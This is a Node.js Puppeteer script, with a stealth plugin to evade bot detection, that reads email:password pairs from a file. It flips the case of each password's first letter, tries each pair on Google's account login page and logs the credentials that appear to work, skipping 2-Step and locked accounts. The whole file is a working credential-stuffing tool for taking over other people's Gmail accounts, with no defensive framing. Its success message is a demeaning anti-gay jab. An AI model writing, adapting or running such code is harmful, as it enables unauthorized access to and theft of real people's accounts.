const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const values = ['Wrong', '2-Step', 'keep', 'Verification', "changed", "find", "Step", "email", "Check", "check", "2", "sent", "valid", "locked", "Type", "Open", "verify", "Verify"];
puppeteer.use(StealthPlugin());
var JFile = require('jfile');
require('dotenv').config()


//Check
var myF = new JFile("./data.txt");


//Swap front character to uppecase
function capitalizeWords(arr) {
  return arr.map(element => {
    return element.charAt(0).toUpperCase() + element.substring(1);
  });
}

//Swap front character to lowercase
function decapitalizeWords(arr) {
  return arr.map(element => {
    return element.charAt(0).toLowerCase() + element.substring(1);
  });
}

//Check if front character upper
function checkUpper(string) {
  return /^\p{Lu}/u.test(string);
}



(async () => {
  //Initialize puppeteer
  const browser = await puppeteer.launch({
    headless: false,
    args: [
      '--no-sandbox',
      '--disable-gpu',
      '--enable-webgl',
      '--window-size=800,800'
    ]
  });

  //Puppeteer Config 
  const loginUrl = "https://accounts.google.com/AccountChooser?service=mail&continue=https://google.com&hl=en";
  const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';
  const page = await browser.newPage();
  await page.setUserAgent(ua);
  await page.goto(loginUrl, { waitUntil: 'networkidle2' });

  //Loop through data
  for (let i = 0; i < process.env.LOOP_COUNT; i++) {

    try {

      //Search for email box in gmail login page
      await page.type('input[type="email"]', myF.lines[i].split(":")[0]);

      //Hit Enter once the box filled
      await page.keyboard.press('Enter');

      //Timeout for loading transition between email page and password page
      await page.waitForTimeout(3000);

      //Check whether the email is valid or not
      const error = await page.evaluate((strings) => {
        const text = document.body.innerText;
        return strings.filter(string => text.includes(string));
      }, values);

      //If email not valid
      if (error.includes("find") || error.includes("valid")) {
        await page.goto(loginUrl, { waitUntil: 'networkidle2' });
        continue;
      } else if (error.includes("locked") || error.includes("Type") || error.includes("Check") || error.includes("Open")) {
        await page.goto(loginUrl, { waitUntil: 'networkidle2' });
        continue;
      }

      //If email is valid enter password
      await page.type('input[type="password"]', (checkUpper([myF.lines[i].split(":")[1]]) ? decapitalizeWords([myF.lines[i].split(":")[1]]) : capitalizeWords([myF.lines[i].split(":")[1]])));

      //Hit Enter once the box filled
      await page.keyboard.press('Enter');

      //Timeout for loading transition between email page and password page (Adjust this duration based on your internet speed)
      await page.waitForTimeout(4000);

      //Check whether the password is correct or not
      const matches = await page.evaluate((strings) => {
        const text = document.body.innerText;
        return strings.filter(string => text.includes(string));
      }, values);

      if(matches.includes("2-Step") || matches.includes("verification")) {
        await page.goto(loginUrl, { waitUntil: 'networkidle2' });
        continue;
      }
      

      //If password valid
      if (matches.includes("verify") || matches.includes("keep")) {
        console.log(1 + i + ": Sorry, You're Gay : " + myF.lines[i].split(":")[0] + " : " + (checkUpper(myF.lines[i].split(":")[1]) ? myF.lines[i].split(":")[1].charAt(0).toLowerCase() + myF.lines[i].split(":")[1].substring(1): myF.lines[i].split(":")[1].charAt(0).toUpperCase() + myF.lines[i].split(":")[1].substring(1)))
      }

      await page.goto(loginUrl, { waitUntil: 'networkidle2' });
      continue

    } catch (error) {

      console.log(1 + i + " : Account Error")
      await page.goto(loginUrl, { waitUntil: 'networkidle2' });
      continue;

    }

  }

})();


